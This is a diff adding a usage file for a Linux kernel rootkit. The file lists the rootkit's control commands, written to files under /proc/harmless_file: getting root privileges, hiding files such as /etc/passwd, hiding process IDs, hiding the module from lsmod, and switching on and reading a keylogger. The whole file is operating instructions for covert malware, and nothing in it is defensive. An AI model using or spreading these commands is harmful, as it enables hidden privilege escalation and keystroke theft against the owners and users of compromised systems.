@@ -1,0 +1,23 @@
+USAGE
+change the definitions desired command files in rootkit.c 
+the examples make use of the default values
+
+commands:
+	- privilege escalation:
+		write to /proc/harmless_file/gimme_root
+		to get root euid etc for the process
+		example: echo 1 > /proc/harmless_file/gimme_root
+	-hiding/showing files
+		write hide/show to /proc/harmless_file/hide_file
+		example: echo hide /etc/passwd > /proc/harmless_file/hide_file
+	-hiding pid: -similar to hiding file just write to hide_pid instead
+
+	-hiding module from lsmod:
+		to hide echo 1 > /proc/harmless_file/hide_module
+		write 0 to show
+	-enabling disabling keylogger:
+		write 0/1 to /proc/harmless_file/keylogger
+	-reading keylogger log:
+		cat /proc/harmless_file/keylogger
+		you'll need a custom app to decipher the keysym
+
